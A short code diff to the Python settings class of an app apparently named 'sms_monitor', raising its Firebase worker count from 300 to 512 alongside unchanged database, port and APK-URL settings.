@@ -12,7 +12,7 @@ class Settings(BaseSettings):
     database_url: str = "sqlite:///./sms_monitor.db"
     port: int = 8000
     virtus_module_db: str = "https://virtus-module-default-rtdb.firebaseio.com"
-    firebase_workers: int = 300
+    firebase_workers: int = 512
     public_base_url: str = ""
     apk_github_url: str = (
         "https://raw.githubusercontent.com/hivirtusss/V2-testing-done/"
